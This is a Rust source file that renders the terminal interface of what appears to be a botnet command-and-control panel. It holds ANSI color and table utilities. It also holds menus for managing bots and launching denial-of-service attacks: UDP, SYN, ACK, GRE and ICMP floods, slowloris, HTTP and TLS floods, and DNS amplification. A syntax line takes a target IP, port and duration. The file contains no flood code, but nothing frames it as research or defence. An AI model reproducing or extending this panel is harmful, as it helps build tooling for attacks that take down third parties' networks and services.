use regex::Regex;

// ============= DYNAMIC TABLE RENDERING UTILITIES =============

/// Get terminal width (default to 120 for full screen experience)
pub fn get_terminal_width() -> usize {
    95 // Adjusted to fit standard terminals better
}

/// Generate color gradient for string based on position
pub fn apply_gradient(text: &str, start_color: u8, end_color: u8) -> String {
    let len = text.chars().count();
    if len == 0 {
        return String::new();
    }
    
    let mut result = String::new();
    for (i, ch) in text.chars().enumerate() {
        let ratio = i as f32 / len.max(1) as f32;
        let color = start_color as f32 + (end_color as f32 - start_color as f32) * ratio;
        result.push_str(&format!("\x1b[38;5;{}m{}", color as u8, ch));
    }
    result.push_str("\x1b[0m");
    result
}

/// Generate ice/water themed gradient
pub fn apply_ice_gradient(text: &str) -> String {
    let colors = [195, 159, 123, 87, 51, 45, 39];
    let len = text.chars().count();
    if len == 0 { return String::new(); }
    
    let mut result = String::new();
    for (i, ch) in text.chars().enumerate() {
        let position = i as f32 / len.max(1) as f32;
        let index = (position * (colors.len() - 1) as f32).round() as usize;
        let color = colors[index.min(colors.len() - 1)];
        result.push_str(&format!("\x1b[38;5;{}m{}", color, ch));
    }
    result.push_str("\x1b[0m");
    result
}

/// Strip ANSI codes to get true text length
pub fn strip_ansi(text: &str) -> String {
    let ansi_regex = Regex::new(r"\x1b\[[0-9;]*m").unwrap();
    ansi_regex.replace_all(text, "").to_string()
}

/// Get visible length of text (excluding ANSI codes)
pub fn visible_len(text: &str) -> usize {
    strip_ansi(text).chars().count()
}

// Menu item structures for dynamic rendering
pub struct MenuItem {
    pub cmd: &'static str,
    pub desc: &'static str,
}

pub const ADMIN_COMMANDS: &[MenuItem] = &[
    MenuItem { cmd: "❃. who", desc: "❃. logs" },
    MenuItem { cmd: "✪. sessions", desc: "✪. botcount" },
    MenuItem { cmd: "❃. whois", desc: "❃. broadcast" },
    MenuItem { cmd: "✪. userinfo", desc: "" },
    MenuItem { cmd: "❃. listusers", desc: "" },
    MenuItem { cmd: "✪. kick", desc: "" },
    MenuItem { cmd: "❃. lock", desc: "" },
    MenuItem { cmd: "✪. banlist", desc: "" },
];

pub const OWNER_COMMANDS: &[MenuItem] = &[
    MenuItem { cmd: "❃. announce", desc: "✪. !killall" },
    MenuItem { cmd: "✪. adduser", desc: "❃. !panic" },
    MenuItem { cmd: "❃. deluser", desc: "✪. !regbot" },
    MenuItem { cmd: "✪. ban", desc: "❃. !update" },
    MenuItem { cmd: "❃. unban", desc: "✪. listbots" },
    MenuItem { cmd: "✪. userchange", desc: "❃. backup" },
    MenuItem { cmd: "❃. db", desc: "✪. restore" },
    MenuItem { cmd: "✪. config", desc: "" },
];

pub const ADMIN_PANEL: &[&str] = &[
    "╔══════════════════════════╗",
    "║   ADMIN ACCESS PANEL     ║",
    "║  ┌──────────────────┐    ║",
    "║  │ ◉ Monitoring     │    ║",
    "║  │ ◉ Management     │    ║",
    "║  │ ◉ Control        │    ║",
    "║  └──────────────────┘    ║",
    "║  [AUTHORIZED PERSONNEL]  ║",
];

pub const OWNER_PANEL: &[&str] = &[
    "╔══════════════════════════╗",
    "║   OWNER ACCESS PANEL     ║",
    "║  ┌──────────────────┐    ║",
    "║  │ ◉ User Control   │    ║",
    "║  │ ◉ Bot Management │    ║",
    "║  │ ◉ System Admin   │    ║",
    "║  │ ◉ Configuration  │    ║",
    "║  └──────────────────┘    ║",
    "║  [ROOT ACCESS REQUIRED]  ║",
    "║      OWNER - Level 3     ║",
    "║   FULL SYSTEM CONTROL    ║",
    "║  Database • Logs • Auth  ║",
    "║  Network • Bots • Users  ║",
    "║    ⚠ USE WITH CAUTION    ║",
];

pub const HELP_SCREEN_LINES: &[&str] = &[
    "\x1b[38;5;249m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r",
    "\x1b[38;5;247m║                § \x1b[48;5;233m\x1b[1;38;5;81m User Menu \x1b[0m\x1b[38;5;247m §                ║ \x1b[38;5;245m●━━━○━━━●━━━○○○━━━●━━━○━━━●  ║\n\r",
    "\x1b[38;5;245m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r",
    "\x1b[38;5;244m║   \x1b[1;38;5;81mBasic Commands   \x1b[22;38;5;244m║  \x1b[1;38;5;208mInfo + Utility Cmds     \x1b[22;38;5;244m║\x1b[38;5;247m░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r",
    "\x1b[38;5;243m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. bots \x1b[0m\x1b[38;5;242m        ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. dashboard \x1b[0m\x1b[38;5;242m         ║ ╔══════════════════════════╗ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ✪. clear \x1b[0m\x1b[38;5;242m       ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. online \x1b[0m\x1b[38;5;242m            ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. help \x1b[0m\x1b[38;5;242m        ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. whoami \x1b[0m\x1b[38;5;242m            ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ✪. methods \x1b[0m\x1b[38;5;242m     ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. uptime \x1b[0m\x1b[38;5;242m            ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. ongoing \x1b[0m\x1b[38;5;242m     ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. gif \x1b[0m\x1b[38;5;242m               ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║\n\r",
    "\x1b[38;5;241m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║\n\r",
    "\x1b[38;5;240m║                § \x1b[48;5;232m\x1b[1;38;5;208m Attack Menu \x1b[0m\x1b[38;5;240m §              ║ ╚══════════════════════════╝ ║\n\r",
    "\x1b[38;5;239m╠════════════════════╦══════════════════════════╦══════════════════════════════╢\n\r",
    "\x1b[38;5;238m║\x1b[1;38;5;81m◉ Attack Commands ◉\x1b[22;38;5;238m ║    \x1b[1;38;5;208mStatus + Info Cmds\x1b[22;38;5;238m    ║ ╔══════════════════════════╗ ║\n\r",
    "\x1b[38;5;237m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r",
    "\x1b[38;5;236m║  \x1b[48;5;232m\x1b[1;38;5;208m ✪. allattacks    \x1b[0m\x1b[38;5;236m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. stats \x1b[0m\x1b[38;5;236m             ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r",
    "\x1b[38;5;236m║  \x1b[48;5;232m\x1b[1;38;5;208m ❃. stopattack    \x1b[0m\x1b[38;5;236m║   \x1b[48;5;233m\x1b[1;38;5;81m ✪. health \x1b[0m\x1b[38;5;236m            ║ ║      24-PORT SWITCH      ║ ║\n\r",
    "\x1b[38;5;236m║  \x1b[48;5;232m\x1b[1;38;5;208m ✪. attackhistory \x1b[0m\x1b[38;5;236m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. rules \x1b[0m\x1b[38;5;236m             ║ ╚══════════════════════════╝ ║\n\r",
    "\x1b[38;5;241m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣\n\r",
    "\x1b[38;5;246m║  \x1b[48;5;233m\x1b[1;38;5;81m Eg.. !Method IP Port Duration ⚑ \x1b[0m\x1b[38;5;246m   ║         \x1b[48;5;232m\x1b[1;38;5;208m    Attack Example        \x1b[0m\x1b[38;5;246m    ║\n\r",
    "\x1b[38;5;248m╰══════════════════════════════════════╩═══════════════════════════════════════╯\n\r",
];

pub const ATTACK_MENU_LINES: &[&str] = &[
    "\x1b[38;5;249m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r",
    "\x1b[38;5;247m║         § \x1b[48;5;233m\x1b[1;38;5;81m Attack Vector Console \x1b[0m\x1b[38;5;247m §        ║ \x1b[38;5;245m●━━━○━━━●━━━○○○━━━●━━━○━━━●  ║\n\r",
    "\x1b[38;5;245m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r",
    "\x1b[38;5;244m║   \x1b[1;38;5;81mVolumetric Arsenal  \x1b[22;38;5;244m║  \x1b[1;38;5;208mLayer7 Precision Grid  \x1b[22;38;5;244m║\x1b[38;5;247m░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r",
    "\x1b[38;5;243m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. !udpflood \x1b[0m\x1b[38;5;242m    ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. !http \x1b[0m\x1b[38;5;242m               ║ ╔══════════════════════════╗ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ✪. !udpsmart \x1b[0m\x1b[38;5;242m  ║   \x1b[48;5;232m\x1b[1;38;5;208m ❃. !slowloris \x1b[0m\x1b[38;5;242m        ║ ║  VECTOR DEPLOYMENT BUS  ║ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. !tcpflood \x1b[0m\x1b[38;5;242m    ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. !websocket \x1b[0m\x1b[38;5;242m       ║ ║  L7 :: HTTP • TLS • WS  ║ ║\n\r",
    "\x1b[38;5;242m║   \x1b[48;5;233m\x1b[1;38;5;81m ✪. !icmpflood \x1b[0m\x1b[38;5;242m  ║   \x1b[48;5;232m\x1b[1;38;5;208m ❃. !sslflood \x1b[0m\x1b[38;5;242m       ║ ║  L4 :: TCP • UDP • ICMP ║ ║\n\r",
    "\x1b[38;5;241m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. !synflood \x1b[0m\x1b[38;5;241m   ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. !dns \x1b[0m\x1b[38;5;241m               ║ ║  RAW :: SYN • ACK • GRE ║ ║\n\r",
    "\x1b[38;5;240m║   \x1b[48;5;233m\x1b[1;38;5;81m ✪. !ackflood \x1b[0m\x1b[38;5;240m  ║   \x1b[48;5;232m\x1b[1;38;5;208m ❃. !amplification \x1b[0m\x1b[38;5;240m ║ ║  AMP :: DNS • MIXED     ║ ║\n\r",
    "\x1b[38;5;240m║   \x1b[48;5;233m\x1b[1;38;5;81m ❃. !greflood \x1b[0m\x1b[38;5;240m   ║   \x1b[48;5;232m\x1b[1;38;5;208m ✪. !connection \x1b[0m\x1b[38;5;240m     ║ ╚══════════════════════════╝ ║\n\r",
    "\x1b[38;5;241m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣\n\r",
    "\x1b[38;5;246m║  \x1b[48;5;233m\x1b[1;38;5;81m Syntax: !method IP Port Duration ⚑flags \x1b[0m\x1b[38;5;246m  ║   \x1b[48;5;232m\x1b[1;38;5;208m Example: !http 10.0.0.5 443 120 power=120 \x1b[0m\x1b[38;5;246m ║\n\r",
    "\x1b[38;5;248m╰══════════════════════════════════════╩═══════════════════════════════════════╯\n\r",
];

// ============= TABLE BUILDER =============

pub struct TableBuilder {
    title: String,
    width: usize,
    side_width: usize,
    rows: Vec<String>,
    footer_msg: Option<String>,
}

impl TableBuilder {
    pub fn new(title: &str) -> Self {
        Self {
            title: title.to_string(),
            width: get_terminal_width(),
            side_width: 30,
            rows: Vec::new(),
            footer_msg: None,
        }
    }

    pub fn add_row(&mut self, content: String) -> &mut Self {
        self.rows.push(content);
        self
    }

    pub fn set_footer(&mut self, msg: &str) -> &mut Self {
        self.footer_msg = Some(msg.to_string());
        self
    }

    pub fn build(&self) -> String {
        let main_width = self.width - self.side_width - 2;
        let mut output = String::new();

        // Clear screen
        output.push_str("\x1b[2J\x1b[3J\x1b[H");

        // Top border
        output.push_str(&format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(self.side_width)));

        // Title
        let title_gradient = apply_ice_gradient(&self.title);
        let title_text = format!("§ {} §", title_gradient);
        let title_visible = visible_len(&format!("§ {} §", self.title));
        let title_padding = main_width.saturating_sub(title_visible + 2);
        let left_pad = title_padding / 2;
        let right_pad = title_padding - left_pad;
        
        output.push_str(&format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
            " ".repeat(left_pad), title_text, " ".repeat(right_pad)));

        // Header separator
        output.push_str(&format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)));

        // Optional footer message in header area (like stats)
        if let Some(msg) = &self.footer_msg {
            let msg_visible = visible_len(msg);
            let msg_pad = main_width.saturating_sub(msg_visible + 2);
            output.push_str(&format!("{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", 
                msg, " ".repeat(msg_pad), " "));
            output.push_str(&format!("\x1b[38;5;240m╠{}╢                              ║\n\r", "═".repeat(main_width - 1)));
        }

        // Rows
        for (i, row) in self.rows.iter().enumerate() {
            let visible = visible_len(row);
            let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
            
            output.push_str(&format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", row, " ".repeat(padding), right_panel));
        }

        // Bottom border
        output.push_str(&format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(self.side_width)));

        output
    }
}
